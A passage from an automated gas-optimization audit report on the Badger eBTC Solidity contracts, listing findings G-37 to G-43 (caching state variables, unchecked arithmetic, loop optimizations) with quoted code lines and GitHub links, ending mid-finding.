[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L654](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L654)


</details>

# 


## [G-37] Superfluous event fields
- Severity: Gas Optimization
- Confidence: High

### Description
Block.timestamp and block.number are added to event information by default so adding them manually wastes gas.

<details>

<summary>
There are 1 instances of this issue:

</summary>

###
#

```
File: contracts/Interfaces/IPriceFeed.sol

13    event UnhealthyFallbackCaller(address indexed _fallbackCaller, uint256 timestamp);
```
The event `UnhealthyFallbackCaller` in the contract `IPriceFeed` includes the field `timestamp` which is superfluous:
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IPriceFeed.sol#L13](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IPriceFeed.sol#L13)


</details>

# 


## [G-38] Cache Array Length Outside of Loop
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 9

### Description
When using arrays in a for loop, calling .length on every iteration will result in unnecessary gas expenses. Instead, it is recommended to cache the array length beforehand, which saves 3 gas per iteration. For storage arrays, an additional 100 gas per iteration (except the first) can be saved by pre-caching the length

<details>

<summary>
There are 3 instances of this issue:

</summary>

###
#

```
File: contracts/Governor.sol

57    i < _usrs.length
```
 caching the length of array
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L57](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L57)


#

```
File: contracts/Governor.sol

122    i < roleIds.length
```
 caching the length of array
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L122](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L122)


#

```
File: contracts/Governor.sol

137    i < _sigs.length
```
 caching the length of array
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L137](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L137)


</details>

# 


## [G-39] State variables should be cached in stack variables rather than re-reading them from storage
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 2813

### Description
State variables should be cached instead of re-reading them.Subsequent reads incur a 100 gas penalty.Caching such variables replaces the Gwarmaccess with much cheaper stack reads.

<details>

<summary>
There are 29 instances of this issue:

</summary>

###
#

```
File: contracts/ActivePool.sol

261    function flashLoan(
262            IERC3156FlashBorrower receiver,
263            address token,
264            uint256 amount,
265            bytes calldata data
266        ) external override returns (bool) 
```
 should cache the following state variables:
	- 
```
File: contracts/ActivePool.sol

31    uint256 internal systemCollShares
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L261-L310](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L261-L310)


#

```
File: contracts/BorrowerOperations.sol

1077    function flashLoan(
1078            IERC3156FlashBorrower receiver,
1079            address token,
1080            uint256 amount,
1081            bytes calldata data
1082        ) external override returns (bool) 
```
 should cache the following state variables:
	- 
```
File: contracts/BorrowerOperations.sol

57    address public feeRecipientAddress
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1077-L1108](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1077-L1108)


#

```
File: contracts/CdpManager.sol

135    function _redeemCollateralFromCdp(
136            SingleRedemptionInputs memory _redeemColFromCdp
137        ) internal returns (SingleRedemptionValues memory singleRedemption) 
```
 should cache the following state variables:
	- 
```
File: contracts/CdpManagerStorage.sol

168    mapping(bytes32 => Cdp) public Cdps
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L135-L234](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L135-L234)


#

```
File: contracts/CdpManager.sol

550    function _addCdpIdToArray(bytes32 _cdpId) internal returns (uint128 index) 
```
 should cache the following state variables:
	- 
```
File: contracts/CdpManagerStorage.sol

205    bytes32[] public CdpIds
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L550-L563](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L550-L563)


#

```
File: contracts/CdpManager.sol

689    function _updateLastRedemptionTimestamp() internal 
```
 should cache the following state variables:
	- 
```
File: contracts/CdpManagerStorage.sol

166    uint256 public lastRedemptionTimestamp
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L689-L700](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L689-L700)


#

```
File: contracts/CdpManager.sol

709    function _minutesPassedSinceLastRedemption() internal view returns (uint256) 
```
 should cache the following state variables:
	- 
```
File: contracts/CdpManagerStorage.sol

166    uint256 public lastRedemptionTimestamp
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L709-L714](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L709-L714)


#

```
File: contracts/CdpManager.sol

905    function initializeCdp(
906            bytes32 _cdpId,
907            uint256 _debt,
908            uint256 _coll,
909            uint256 _liquidatorRewardShares,
910            address _borrower
911        ) external 
```
 should cache the following state variables:
	- 
```
File: contracts/CdpManagerStorage.sol

168    mapping(bytes32 => Cdp) public Cdps
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L905-L936](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L905-L936)


#

```
File: contracts/CdpManagerStorage.sol

260    function _closeCdpWithoutRemovingSortedCdps(bytes32 _cdpId, Status closedStatus) internal 
```
 should cache the following state variables:
	- 
```
File: contracts/CdpManagerStorage.sol

168    mapping(bytes32 => Cdp) public Cdps
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L260-L280](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L260-L280)


#

```
File: contracts/CdpManagerStorage.sol

410    function _removeStake(bytes32 _cdpId) internal 
```
 should cache the following state variables:
	- 
```
File: contracts/CdpManagerStorage.sol

168    mapping(bytes32 => Cdp) public Cdps
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L410-L415](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L410-L415)


#

```
File: contracts/CdpManagerStorage.sol

441    function _computeNewStake(uint256 _coll) internal view returns (uint256) 
```
 should cache the following state variables:
	- 
```
File: contracts/CdpManagerStorage.sol

176    uint256 public totalCollateralSnapshot
```

	- 
```
File: contracts/CdpManagerStorage.sol

173    uint256 public totalStakesSnapshot
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L441-L457](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L441-L457)


#

```
File: contracts/CdpManagerStorage.sol

463    function _removeCdp(bytes32 _cdpId, uint256 cdpIdsArrayLength) internal 
```
 should cache the following state variables:
	- 
```
File: contracts/CdpManagerStorage.sol

168    mapping(bytes32 => Cdp) public Cdps
```

	- 
```
File: contracts/CdpManagerStorage.sol

205    bytes32[] public CdpIds
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L463-L484](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L463-L484)


#

```
File: contracts/CdpManagerStorage.sol

616    function getAccumulatedFeeSplitApplied(
617            bytes32 _cdpId,
618            uint256 _systemStEthFeePerUnitIndex
619        ) public view returns (uint256, uint256) 
```
 should cache the following state variables:
	- 
```
File: contracts/CdpManagerStorage.sol

168    mapping(bytes32 => Cdp) public Cdps
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L616-L645](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L616-L645)


#

```
File: contracts/CdpManagerStorage.sol

761    function _calcSyncedGlobalAccounting(
762            uint256 _newIndex,
763            uint256 _oldIndex
764        ) internal view returns (uint256, uint256, uint256) 
```
 should cache the following state variables:
	- 
```
File: contracts/CdpManagerStorage.sol

198    uint256 public override systemStEthFeePerUnitIndex
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L761-L779](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L761-L779)


#

```
File: contracts/EBTCToken.sol

246    function _transfer(address sender, address recipient, uint256 amount) internal 
```
 should cache the following state variables:
	- 
```
File: contracts/EBTCToken.sol

51    mapping(address => uint256) private _balances
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L246-L260](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L246-L260)


#

```
File: contracts/LiquidationLibrary.sol

862    function _redistributeDebt(uint256 _debt) internal 
```
 should cache the following state variables:
	- 
```
File: contracts/CdpManagerStorage.sol

187    uint256 public systemDebtRedistributionIndex
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L862-L892](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L862-L892)


#

```
File: contracts/PriceFeed.sol

98    function fetchPrice() external override returns (uint256) 
```
 should cache the following state variables:
	- 
```
File: contracts/PriceFeed.sol

48    Status public status
```

	- 
```
File: contracts/PriceFeed.sol

45    uint256 public lastGoodPrice
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L98-L352](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L98-L352)


#

```
File: contracts/PriceFeed.sol

358    function setFallbackCaller(address _fallbackCaller) external requiresAuth 
```
 should cache the following state variables:
	- 
```
File: contracts/PriceFeed.sol

29    IFallbackCaller public fallbackCaller
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L358-L389](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L358-L389)


#

```
File: contracts/PriceFeed.sol

582    function _getCurrentFallbackResponse()
583            internal
584            view
585            returns (FallbackResponse memory fallbackResponse)
586        
```
 should cache the following state variables:
	- 
```
File: contracts/PriceFeed.sol

29    IFallbackCaller public fallbackCaller
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L582-L602](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L582-L602)


#

```
File: contracts/SortedCdps.sol

173    function _cdpOfOwnerByIndex(
174            address owner,
175            uint256 index,
176            bytes32 startNodeId,
177            uint maxNodes
178        ) internal view returns (bytes32, bool) 
```
 should cache the following state variables:
	- 
```
File: contracts/SortedCdps.sol

77    Data public data
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L173-L210](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L173-L210)


#

```
File: contracts/SortedCdps.sol

237    function _cdpCountOf(
238            address owner,
239            bytes32 startNodeId,
240            uint maxNodes
241        ) internal view returns (uint256, bytes32) 
```
 should cache the following state variables:
	- 
```
File: contracts/SortedCdps.sol

77    Data public data
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L237-L264](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L237-L264)


#

```
File: contracts/SortedCdps.sol

299    function _getCdpsOf(
300            address owner,
301            bytes32 startNodeId,
302            uint maxNodes,
303            uint maxArraySize
304        ) internal view returns (bytes32[] memory, uint256, bytes32) 
```
 should cache the following state variables:
	- 
```
File: contracts/SortedCdps.sol

77    Data public data
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L299-L336](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L299-L336)


#

```
File: contracts/SortedCdps.sol

344    function insert(
345            address owner,
346            uint256 _NICR,
347            bytes32 _prevId,
348            bytes32 _nextId
349        ) external override returns (bytes32) 
```
 should cache the following state variables:
	- 
```
File: contracts/SortedCdps.sol

79    uint256 public nextCdpNonce
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L344-L361](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L344-L361)


#

```
File: contracts/SortedCdps.sol

363    function _insert(bytes32 _id, uint256 _NICR, bytes32 _prevId, bytes32 _nextId) internal 
```
 should cache the following state variables:
	- 
```
File: contracts/SortedCdps.sol

77    Data public data
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L363-L406](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L363-L406)


#

```
File: contracts/SortedCdps.sol

419    function batchRemove(bytes32[] memory _ids) external override 
```
 should cache the following state variables:
	- 
```
File: contracts/SortedCdps.sol

77    Data public data
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L419-L454](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L419-L454)


#

```
File: contracts/SortedCdps.sol

456    function _remove(bytes32 _id) internal 
```
 should cache the following state variables:
	- 
```
File: contracts/SortedCdps.sol

77    Data public data
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L456-L491](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L456-L491)


#

```
File: contracts/SortedCdps.sol

519    function contains(bytes32 _id) public view override returns (bool) 
```
 should cache the following state variables:
	- 
```
File: contracts/SortedCdps.sol

77    Data public data
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L519-L526](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L519-L526)


#

```
File: contracts/SortedCdps.sol

591    function _validInsertPosition(
592            uint256 _NICR,
593            bytes32 _prevId,
594            bytes32 _nextId
595        ) internal view returns (bool) 
```
 should cache the following state variables:
	- 
```
File: contracts/SortedCdps.sol

77    Data public data
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L591-L612](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L591-L612)


#

```
File: contracts/SortedCdps.sol

619    function _descendList(uint256 _NICR, bytes32 _startId) internal view returns (bytes32, bytes32) 
```
 should cache the following state variables:
	- 
```
File: contracts/SortedCdps.sol

77    Data public data
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L619-L635](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L619-L635)


#

```
File: contracts/SortedCdps.sol

642    function _ascendList(uint256 _NICR, bytes32 _startId) internal view returns (bytes32, bytes32) 
```
 should cache the following state variables:
	- 
```
File: contracts/SortedCdps.sol

77    Data public data
```


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L642-L658](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L642-L658)


</details>

# 


## [G-40] Safe Subtraction Should Be Unchecked
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 935

### Description
This detector identifies subtraction operations where the subtraction could safely be unchecked. This occurs when a prior if-statement or require() function ensures that the first operand (minuend) is greater than or equal to the second operand (subtrahend). In these cases, an unchecked subtraction would not result in an underflow error, and can save gas by skipping the redundant check.

<details>

<summary>
There are 11 instances of this issue:

</summary>

###
#

```
File: contracts/CdpManagerStorage.sol

557    uint256 deltaIndex = _newIndex - _prevIndex
```
 should be unchecked because there is check:<br>
```
File: contracts/CdpManagerStorage.sol

556    require(_newIndex > _prevIndex, "CDPManager: only take fee with bigger new index")
```
<br><br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L557](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L557)


#

```
File: contracts/CdpManagerStorage.sol

637    return (
638                    _feeSplitDistributed,
639                    (_scaledCdpColl - _feeSplitDistributed) / DECIMAL_PRECISION
640                )
```
 should be unchecked because there is check:<br>
```
File: contracts/CdpManagerStorage.sol

636    _scaledCdpColl > _feeSplitDistributed
```
<br><br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L637-L640](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L637-L640)


#

```
File: contracts/CdpManager.sol

690    uint256 timePassed = block.timestamp > lastRedemptionTimestamp
691                ? block.timestamp - lastRedemptionTimestamp
692                : 0
```
 should be unchecked because there is check:<br>
```
File: contracts/CdpManager.sol

690    uint256 timePassed = block.timestamp > lastRedemptionTimestamp
691                ? block.timestamp - lastRedemptionTimestamp
692                : 0
```
<br><br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L690-L692](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L690-L692)


#

```
File: contracts/CdpManager.sol

710    return
711                block.timestamp > lastRedemptionTimestamp
712                    ? ((block.timestamp - lastRedemptionTimestamp) / SECONDS_IN_ONE_MINUTE)
713                    : 0
```
 should be unchecked because there is check:<br>
```
File: contracts/CdpManager.sol

710    return
711                block.timestamp > lastRedemptionTimestamp
712                    ? ((block.timestamp - lastRedemptionTimestamp) / SECONDS_IN_ONE_MINUTE)
713                    : 0
```
<br><br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L710-L713](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L710-L713)


#

```
File: contracts/LiquidationLibrary.sol

367    emit CdpLiquidated(
368                _recoveryState.cdpId,
369                _borrower,
370                _totalDebtToBurn,
371                // please note this is the collateral share of the liquidated CDP
372                _cappedColPortion,
373                CdpOperation.liquidateInRecoveryMode,
374                msg.sender,
375                _cappedColl > _debtToColl ? (_cappedColl - _debtToColl) : 0
376            )
```
 should be unchecked because there is check:<br>
```
File: contracts/LiquidationLibrary.sol

367    emit CdpLiquidated(
368                _recoveryState.cdpId,
369                _borrower,
370                _totalDebtToBurn,
371                // please note this is the collateral share of the liquidated CDP
372                _cappedColPortion,
373                CdpOperation.liquidateInRecoveryMode,
374                msg.sender,
375                _cappedColl > _debtToColl ? (_cappedColl - _debtToColl) : 0
376            )
```
<br><br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L367-L376](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L367-L376)


#

```
File: contracts/LiquidationLibrary.sol

567    collSurplus = _totalColToSend - toLiquidator
```
 should be unchecked because there is check:<br>
```
File: contracts/LiquidationLibrary.sol

564    assert(toLiquidator < _totalColToSend)
```
<br><br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L567](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L567)


#

```
File: contracts/LiquidationLibrary.sol

281    emit CdpLiquidated(
282                _liqState.cdpId,
283                _borrower,
284                _totalDebtToBurn,
285                // please note this is the collateral share of the liquidated CDP
286                _cappedColPortion,
287                CdpOperation.liquidateInNormalMode,
288                msg.sender,
289                _cappedColl > _debtToColl ? (_cappedColl - _debtToColl) : 0
290            )
```
 should be unchecked because there is check:<br>
```
File: contracts/LiquidationLibrary.sol

281    emit CdpLiquidated(
282                _liqState.cdpId,
283                _borrower,
284                _totalDebtToBurn,
285                // please note this is the collateral share of the liquidated CDP
286                _cappedColPortion,
287                CdpOperation.liquidateInNormalMode,
288                msg.sender,
289                _cappedColl > _debtToColl ? (_cappedColl - _debtToColl) : 0
290            )
```
<br><br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L281-L290](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L281-L290)


#

```
File: contracts/LiquidationLibrary.sol

594    debtToRedistribute = _debtToRepay < _totalDebtToBurn
595                    ? _totalDebtToBurn - _debtToRepay //  Bad Debt (to be redistributed) is (CdpDebt - Repaid)
596                    : 0
```
 should be unchecked because there is check:<br>
```
File: contracts/LiquidationLibrary.sol

594    debtToRedistribute = _debtToRepay < _totalDebtToBurn
595                    ? _totalDebtToBurn - _debtToRepay //  Bad Debt (to be redistributed) is (CdpDebt - Repaid)
596                    : 0
```
<br><br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L594-L596](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L594-L596)


#

```
File: contracts/LiquidationLibrary.sol

437    emit CdpPartiallyLiquidated(
438                    _cdpId,
439                    sortedCdps.getOwnerAddress(_cdpId),
440                    _partialDebt,
441                    _partialColl,
442                    CdpOperation.partiallyLiquidate,
443                    msg.sender,
444                    _cappedColl > _debtToColl ? (_cappedColl - _debtToColl) : 0
445                )
```
 should be unchecked because there is check:<br>
```
File: contracts/LiquidationLibrary.sol

437    emit CdpPartiallyLiquidated(
438                    _cdpId,
439                    sortedCdps.getOwnerAddress(_cdpId),
440                    _partialDebt,
441                    _partialColl,
442                    CdpOperation.partiallyLiquidate,
443                    msg.sender,
444                    _cappedColl > _debtToColl ? (_cappedColl - _debtToColl) : 0
445                )
```
<br><br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L437-L445](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L437-L445)


#

```
File: contracts/PriceFeed.sol

797    uint256 _scaledDecimal = _stEthEthDecimals > _ethBtcDecimals
798                ? 10 ** (_stEthEthDecimals - _ethBtcDecimals)
799                : 10 ** (_ethBtcDecimals - _stEthEthDecimals)
```
 should be unchecked because there is check:<br>
```
File: contracts/PriceFeed.sol

797    uint256 _scaledDecimal = _stEthEthDecimals > _ethBtcDecimals
798                ? 10 ** (_stEthEthDecimals - _ethBtcDecimals)
799                : 10 ** (_ethBtcDecimals - _stEthEthDecimals)
```
<br><br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L797-L799](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L797-L799)


#

```
File: contracts/SortedCdps.sol

425    bytes32 _lastNext = data.nodes[_ids[_len - 1]].nextId
```
 should be unchecked because there is check:<br>
```
File: contracts/SortedCdps.sol

422    require(_len > 1, "SortedCdps: batchRemove() only apply to multiple cdpIds!")
```
<br><br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L425](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L425)


</details>

# 


## [G-41] Detection of Unnecessary Checked Increments in Solidity Loop Statements
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 600

### Description
Smart contract code that contains checked increments (++i) within loops.Those operations not require overflow checking. In these cases, it is more efficient to use unchecked{++i} or unchecked{i++} to save on gas costs, as this keyword was introduced in Solidity version 0.8.0. By using unchecked, unnecessary overflow checks can be avoided, resulting in a savings of 30-40 gas per loop iteration.

<details>

<summary>
There are 10 instances of this issue:

</summary>

###
#

```
File: contracts/Governor.sol

46    i++
```
 should be inside uncheck block
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L46](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L46)


#

```
File: contracts/Governor.sol

57    i++
```
 should be inside uncheck block
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L57](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L57)


#

```
File: contracts/Governor.sol

76    i++
```
 should be inside uncheck block
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L76](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L76)


#

```
File: contracts/Governor.sol

84    i++
```
 should be inside uncheck block
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L84](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L84)


#

```
File: contracts/Governor.sol

98    i++
```
 should be inside uncheck block
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L98](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L98)


#

```
File: contracts/Governor.sol

107    i++
```
 should be inside uncheck block
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L107](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L107)


#

```
File: contracts/Governor.sol

122    i++
```
 should be inside uncheck block
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L122](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L122)


#

```
File: contracts/Governor.sol

137    ++i
```
 should be inside uncheck block
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L137](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L137)


#

```
File: contracts/SortedCdps.sol

432    ++i
```
 should be inside uncheck block
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L432](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L432)


#

```
File: contracts/SortedCdps.sol

449    ++i
```
 should be inside uncheck block
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L449](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L449)


</details>

# 


## [G-42] Avoid Unnecessary Computation Inside Loops
- Severity: Gas Optimization
- Confidence: High

### Description
This detector identifies instances of computations being performed inside loops that could be performed outside the loop to save gas.

Unnecessary computation inside loops:

Any computation performed inside a loop that doesn't change with each iteration can be moved outside the loop to save gas.This detector identifies instances where the following unnecessary computations are performed inside loops:

- 1 Local variables are read inside loops but never modified within the same loop, indicating they could be cached outside the loop.

- 2 Computations involving constant expressions (literals) which result in the same output in every loop iteration.

By addressing these issues, gas usage can be optimized.

<details>

<summary>
There are 3 instances of this issue:

</summary>

###
#

```
File: contracts/SortedCdps.sol

202    maxNodes > 0 && i >= maxNodes
```
The following computations can be cached outside of loops for gas optimization `maxNodes > 0`<br>.
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L202](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L202)


#

```
File: contracts/SortedCdps.sol

259    maxNodes > 0 && i >= maxNodes
```
The following computations can be cached outside of loops for gas optimization `maxNodes > 0`<br>.
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L259](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L259)


#

```
File: contracts/SortedCdps.sol

330    maxNodes > 0 && i >= maxNodes
```
The following computations can be cached outside of loops for gas optimization `maxNodes > 0`<br>.
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L330](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L330)


</details>

# 


## [G-43] Redundant Contract Existence Check in Consecutive External Calls
- Severity: Gas Optimization
- Confidence: Medium
- Total Gas Saved: 800

### Description
This detector identifies instances where there are consecutive external calls to the same contract, where the subsequent calls could use a low-level call to save gas.

Note: This detector only triggers if the function call does not return any value. 

Prior to 0.8.10, the compiler inserted extra code, including EXTCODESIZE (100 gas), to check for contract existence for external function calls. In more recent Solidity versions the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low-level calls never check for contract existence. 

<details>

<summary>
There are 8 instances of this issue:

</summary>

###
#

```
File: contracts/BorrowerOperations.sol

410    cdpManager.updateCdp(
411                _cdpId,
412                _borrower,
413                vars.collShares,
414                vars.debt,
415                vars.newCollShares,
416                vars.newDebt
417            )
```
This call could be replaced with a low-level call because the contract `ICdpManager` has already been checked in <br>`Line: 343    cdpManager.syncAccounting(_cdpId)`<br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L410-L417](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L410-L417)


#

```
File: contracts/BorrowerOperations.sol

